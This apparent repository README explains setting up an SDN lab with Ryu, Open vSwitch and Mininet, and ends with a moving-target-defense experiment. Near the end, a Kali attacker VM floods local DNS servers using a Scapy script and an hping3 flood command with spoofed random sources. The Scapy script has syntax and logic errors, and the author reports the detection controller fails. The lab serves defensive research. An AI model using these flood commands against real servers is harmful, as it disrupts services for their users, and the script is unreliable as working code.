# Installing and Configuring a SDN environment.

Installing an SDN on an Ubuntu VM typically involves installing a SDN controller, like Ryu, and a virtual switch such as Open vSwitch. Below are the step-by-step commands for setting up Ryu and Open vSwitch on Ubuntu. Please note that you'll need sudo privileges for these commands:

#### STEP 1: Update Ubuntu System 

Update your system's package list to ensure you have the latest packages and versions.

``` $ sudo apt-get update ```

#### Step 2: Install Dependencies

Before we can install Ryu and Open vSwitch, we need to install some dependencies. Python is a key dependency for Ryu and git is required for cloning the Ryu repository from GitHub.

```
$ sudo apt-get install -y python3-pip python3-dev libssl-dev libffi-dev build-essential
$ sudo apt-get install -y git
```

#### Step 3: Install Ryu SDN Controller

We'll use pip, the Python package installer, to install Ryu.

``` $ pip3 install ryu ```

To check the installation of Ryu:

``` $ ryu-manager --version ```

Note: If there is any issue with eventlet 'ALREADY_HANDLED' error, then try uninstalling the eventlet and install a compatible version "0.30.2" of eventlet. The commands are as follows:

```
$ pip uninstall eventlet
$ pip install eventlet==0.30.2
```
This should fix the issue. !

#### Step 4: Install Open vSwitch 

Next, we'll install Open vSwitch using the apt package manager.

``` $ sudo apt-get install -y openvswitch-switch ```

To check the installation of Open vSwitch:

``` $ ovs-vsctl --version ```

#### Step 5: Create a Virtual Network (Optional) (because i dont want messing up the main network):

With Mininet, you can simulate a network topology right on your VM. This step is optional but can be helpful for learning and experimenting. Install Mininet with:

``` $ sudo apt-get install -y mininet```

After these steps, you should have Ryu (an SDN controller) and Open vSwitch (a virtual switch) installed on your Ubuntu VM. This provides a basic SDN setup.

## Testing:

You can test the installed setup by creating a simple network topology using Mininet and then controlling it using the Ryu controller.

Here's how you can test the installation:

#### Step 1: Run a Simple Ryu Application

First, let's run a simple Ryu application. Ryu includes several example applications. We'll use the simple switch application in this case. 

Open a new terminal window and run the following command:

``` $ ryu-manager ryu.app.simple_switch_13 ```

Expected output should be like this:

```
loading app ryu.app.simple_switch_13
loading app ryu.controller.ofp_handler
instantiating app ryu.app.simple_switch_13 of SimpleSwitch13
instantiating app ryu.controller.ofp_handler of OFPHandler
packet in 1 96:ae:1a:c5:31:2e 33:33:00:00:00:16 2
packet in 1 d6:cb:6b:ff:4b:94 33:33:00:00:00:16 1
packet in 1 d6:cb:6b:ff:4b:94 33:33:ff:ff:4b:94 1
packet in 1 96:ae:1a:c5:31:2e 33:33:ff:c5:31:2e 2
packet in 1 d6:cb:6b:ff:4b:94 33:33:00:00:00:16 1
packet in 1 d6:cb:6b:ff:4b:94 33:33:00:00:00:02 1
```
This command starts Ryu with the Simple Switch application, which emulates a basic learning switch. The Ryu application will run in the foreground and print log messages to the console.

#### Step 2: Create a Simple Network with Mininet

Next, we will create a simple network using Mininet in another terminal window.

``` $ sudo mn --controller remote ```

Expected output should be like this:

```
*** Creating network
*** Adding controller
Connecting to remote controller at 127.0.0.1:6653
*** Adding hosts:
h1 h2 
*** Adding switches:
s1 
*** Adding links:
(h1, s1) (h2, s1) 
*** Configuring hosts
h1 h2 
*** Starting controller
c0 
*** Starting 1 switches
s1 ...
*** Starting CLI:
```
This command creates a simple Mininet network that includes a switch and a couple of hosts. The `--controller remote` option tells Mininet to use a remote controller (which is the Ryu instance we started earlier).

#### Step 3: Test the Network

Finally, let's test the network by pinging between the hosts:

From the Mininet console, you can use the `pingall` command to have each host ping all other hosts:

``` $ mininet> pingall ```

Expected output should be like this:

```
*** Ping: testing ping reachability
h1 -> h2 
h2 -> h1 
*** Results: 0% dropped (2/2 received)
```

This should result in output showing pings between the hosts, demonstrating that the network is functioning and the Ryu controller is correctly controlling the switch.

Keep in mind that this is a very simple example. Real-world SDN deployments are often much more complex and may require more advanced configuration and testing.

Note: If you are running all these commands on a single VM, make sure to run Ryu and Mininet in separate terminal windows or in the background. Otherwise, starting Mininet will interrupt Ryu, causing the network to fail.


### Explanation behind the working:

#### Ryu: 

Ryu is an open-source SDN (Software Defined Networking) controller. An SDN controller is like the "brain" of an SDN network. It is a central point that can view and manage all the networking components in the network, like switches, routers, firewalls, etc. Ryu supports various protocols for managing network devices, including OpenFlow, Netconf, OF-config, etc.

In this case, Ryu is used as an OpenFlow controller, which communicates with OpenFlow switches to determine the path of network packets through the network switches.

Ryu is designed to be fully modular – this means its different components (like protocols, network services etc.) are distinct, which makes Ryu flexible and easy to customize.

#### Mininet: 

Mininet is an instant virtual network emulator which can create a whole network of hosts, links, and switches on a single machine (like your VM). The hosts spawned by Mininet are lightweight as they share the resources of the host machine, and yet behave like real machines with their own network stack and file system.

Mininet supports OpenFlow, which makes it perfect to use for SDN simulations. You can quickly prototype a large network and run tests on it. Mininet networks can be controlled by any OpenFlow controller, which in this case is Ryu.

#### The Ping Test: 

The pingall command you used in Mininet is a basic test to check the connectivity of the network. The command instructs every host in the Mininet network to ping every other host.

Here's what happens when you run the pingall command:

Mininet instructs the first host to send a ping packet (ICMP Echo Request) to the second host. This packet is a standard Internet Control Message Protocol (ICMP) packet, and it essentially asks the receiving host to respond.
The packet is sent to the switch. Since this is the first packet the switch has seen from this host, it doesn't know where to send it, so it sends it to the controller (Ryu).
The Ryu controller receives the packet, and, because it's running the simple_switch_13 application, it adds a flow entry to the switch telling it how to forward packets between the two hosts.
The switch forwards the packet to the correct host, and the host sends a ping reply (ICMP Echo Reply) back to the first host following the same process.
This process is repeated for each pair of hosts in the network.

The pingall test is a simple but effective way to ensure that the network is correctly forwarding packets and that the controller is correctly managing the switch.

Now, there are only two nodes, h1 and h2. What if I need to add another node (a virtual computer or device) to the network. Adding a node isnt straight-forward. We should create a Python script that talks to the controller and mininet and establishes the required configurations.

The Python script is named as "custom_topology.py". This file will be available in the repo. Please free to edit or make changes depending on your needs and configurations. 

Before executing the python script, make sure to stop existing mininet network. Run this below command to stop any existing mininet running as a process:

```
sudo mn -c  # This clears the existing Mininet configurations
sudo mn -c  # Execute it twice to ensure all configurations are cleared
```
Run the python script:

``` $ sudo python3 custom_topology.py ```

Expected output looks like this: 

```
*** Adding controller
*** Adding hosts
*** Adding switch
*** Creating links
*** Starting network
*** Configuring hosts
h1 h2 h3 
*** Starting controller
c0 
*** Starting 1 switches
s1 ...
*** Running CLI
*** Starting CLI:
```
Now we can see, that 1 Switch, 1 Controller, and 3 hosts (h1,h2 and h3) are setup and configured to communicate in the network. 

Lets check if the nodes are up: 

```
mininet> nodes
available nodes are: 
c0 h1 h2 h3 s1
```
Lets check if the nodes are communicating: 

```
mininet> pingall
*** Ping: testing ping reachability
h1 -> h2 h3 
h2 -> h1 h3 
h3 -> h1 h2 
*** Results: 0% dropped (6/6 received)
```
When implementing this in real-world, you might not use mininet, as you will be dealing wih real switches/controllers or virtualised switches/controllers. Switches/Controllers might be in a single node/machine or might be in two separate nodes/machines. 

```
sudo apt install virt-manager 
sudo apt install openvswitch-switch -y 

sudo ovs-vsctl add-br br0 

sudo apt install net-tools -y 

sudo ifconfig br0 192.168.233.1/24 
```

``` $ sudo sysctl -w net.ipv4.ip_forward=1 ```

This command modifies a kernel parameter called net.ipv4.ip_forward. When set to 1, it enables IP forwarding, allowing the Linux system to route network traffic between different network interfaces.

``` $ sudo iptables -t nat -A POSTROUTING -s 192.168.233.0/24 -o ens160 -j MASQUERADE ```

This command adds a rule to the NAT table (-t nat) in iptables. The rule specifies that any traffic originating from the subnet 192.168.233.0/24 and going out through the network interface ens160 should be subjected to NAT using the MASQUERADE target.

Note: In my case, the interface is ens160, it might change in your case.

``` 
sudo ovs-vsctl add-port br0 vm1 -- set Interface vm1 type=internal 
sudo ovs-vsctl add-port br0 vm2 -- set Interface vm2 type=internal
```
The ovs-vsctl add-port command adds an internal port named "vm1"/"vm2"(second command) to the OVS bridge "br0," allowing it to participate in the virtual network managed by Open vSwitch.

#### Add the SDN controller to the switch: 
```
sudo ovs-vsctl set-controller br0 tcp:10.102.211.21:6633 // Replace the IP address with the machine that has the SDN controller 

sudo ovs-ofctl add-flow br0 "table=0,cookie=100,priority=100,actions=normal"
```
The ovs-vsctl set-controller command configures the OVS bridge named "br0" to connect to a specific controller at the provided IP address and port. This allows the OVS bridge to establish communication with the controller and receive instructions for network configuration and control in an SDN environment.

View flows / Add flows / Delete flows:

Usage: 
```
sudo ovs-ofctl dump-flows <bridge-name>
sudo ovs-ofctl add-flow <bridge-name> <flow-rules> <actions>
sudo ovs-ofctl del-flows <bridge-name> <flow-rules>
```
Example:

In this case, our bridge is "br0"

Command to list out all the flows from bridge br0:
```
sudo ovs-ofctl dump-flows br0
```
Command to add a flow:
```
sudo ovs-ofctl add-flow br0 "table=0, cookie=1000, priority=100, ip, nw_src=192.168.233.10, action=drop"
```
Explanation:

add-flow is the ovs-ofctl command used to add flows.
br0 is the name of the OVS bridge where the flow will be added.
"table=0" specifies that the flow will be added to table 0.
"cookie=1000" sets the cookie value for the flow to 1000.
"priority=100" determines the priority of the flow, where higher values indicate higher priority.
ip indicates that the flow matches IP packets.
nw_src=192.168.233.10 sets the match criteria for the source IP address, where packets with the source IP address of 192.168.233.10 will match this flow.
action=drop specifies that matched packets should be dropped.

With this flow rule, any IP packet with a source IP address of 192.168.233.10 will match the flow and be dropped.

Command to delete a flow:
```
sudo ovs-ofctl del-flows br0 "cookie=1000/-1"
```
Explanation:

del-flows is the ovs-ofctl command used to delete flows.
br0 is the name of the OVS bridge from which the flows will be deleted.
"cookie=1000/-1" is the match criteria for the flows to be deleted. In this case, it specifies that flows with a cookie value of 1000 will be deleted, regardless of the cookie mask (-1 means all bits are significant in the cookie).


## Focusing on Moving target Defense: 

This is partially incomplete. I have to troubleshoot and analyse the working. 

Please follow this paper published by Professor Dr.Abdullah Aydegar. Link for the paper: https://ieeexplore.ieee.org/document/9858278. This should explain what is Moving target defense and strategies. 

I am explaining the concept in brief. Here, I have 2 VMs of Ubuntu, 1 switch, 1 controller and 1 VM of Kali Linux. 2 VM's are setup with DNS servers hosted locally. If you query a DNS request to these VM's, it should give you a DNS response ! 1 VM of Kali Linux acts as a Attacker machine. We will be using this to attack the 2 Ubuntu VM's. 

### Moving Target Defense (MTD)

It is a concept in cybersecurity that aims to increase the resilience of systems by dynamically changing the attack surface, making it more difficult for adversaries to exploit vulnerabilities. The idea is to constantly change the system's configuration, network parameters, or other elements to reduce the effectiveness of attacks.

In this specific scenario with 2 VMs hosting DNS servers, Kali VM as an attacker, 1 switch, and 1 Ryu controller, here's how MTD can be applied:

#### Architecture Overview:

The two Ubuntu VMs running DNS servers are the potential targets of attack.
The Kali VM acts as the attacker, attempting to compromise the DNS servers.
The switch connects the VMs and facilitates the flow of network traffic.
The Ryu controller is responsible for managing the network flow and implementing security measures.

#### Ryu Controller's Role:
The Ryu controller plays a crucial role in implementing the MTD concept. Its tasks include:

Monitoring: The controller continuously monitors the network traffic and analyzes its characteristics.
Detection: By employing various security mechanisms (such as intrusion detection systems or traffic anomaly detection), the controller identifies potential attacks or suspicious behavior targeting the DNS servers.
Decision-making: Based on the detected threats, the Ryu controller makes decisions on how to dynamically respond and mitigate the attacks.
Configuration: The controller reconfigures the network to redirect legitimate DNS traffic away from the targeted Ubuntu VM and towards another VM, enhancing resilience and ensuring uninterrupted service.

#### Attack Detection and Response:
When the Ryu controller detects an attack targeting one of the Ubuntu VMs running the DNS service, it initiates a response:

Traffic Diversion: The controller reconfigures the switch to redirect legitimate DNS traffic to the unaffected Ubuntu VM running the DNS service. This ensures that legitimate requests are serviced by the operational VM, effectively isolating the targeted VM.
Dynamic IP Address Assignment: The Ryu controller may dynamically assign a new IP address to the unaffected Ubuntu VM, further increasing the difficulty for the attacker to continue their exploitation attempts.

You can create a python script that tells the controller to function based on the scenarios. My script isnt functioning as expected. 

My RYU controller is present on the base Ubuntu machine. I am not using any VM for the controller. I have both my Ubuntu VM's running and ready to accept DNS requests and respond back. While, on the other hand, I have my Kali linux ready to attack / flood the two ubuntu VM's by DNS flooding.

In Kali: Here for the attack, Initially I used Scapy for the attack. 

This is my small python script that performs DNS flooding to the target Ubuntu VM.

Create a new file:

``` $ sudo nano dnsflood.py ```

Copy and Paste the code to the file:

```
from scapy.all import *
import random

target_ip = input("Enter the IP address of the target: ")
target_port = int(input("Enter the port number: ")

# You can even hardcode the target_ip to 53, because thats where the DNS server is listening to.
# target_port = 53

packet_count = int(input("How many packets should i sent to flood the target? "))

websites = ["www.google.com", "www.yahoo.com", "www.facebook.com", "www.fit.edu", "www.example.com"]

for i in range(packet_count):
    website = random.choice(websites)
    packet = IP(dst=target_ip) / UDP(dport=target_port) / DNS(rd=1, qd=DNSQR(qname=website))
    send(packet, verbose=False)

for _ in range(packet_count):
    threading.Thread(target=send_packet).start()
```
Run the python using this command: 

``` $ sudo python3 dnspython.py ```

This should be performing DNS flooding attack to the target VM.

But, I did a little research and got to know about this tool called "hping3". I heard its super powerful. So, I gave it a try.

``` $ sudo hping3 --udp -c 10000 -d 120 -p 53 --flood --rand-source 192.168.233.11 ```

Yes, it is that simple and powerful than scapy. 

Then, comes the main part. The Controller. You should create a python script that tells the controller to monitor for the traffic in the both Ubuntu VM's and mitigate the attack based on flow mentioned in the code. 

I have attached the python script in the repo. Please try to use as an reference, as it would not work as expected. 

``` $ sudo ryu-manager RYU4.py ```

This is how the expected output should be:

```
loading app RYU4.py
loading app ryu.controller.ofp_handler
instantiating app RYU4.py of DNSController
Initializing DNSController...
instantiating app ryu.controller.ofp_handler of OFPHandler
No attack detected.
No attack detected.
Received switch features event...
No attack detected.
No attack detected.
No attack detected.
```
In this case, even though the attack is performed, the controller is not able to detect and mitigate it. That is where my flaw in the code lies on. 








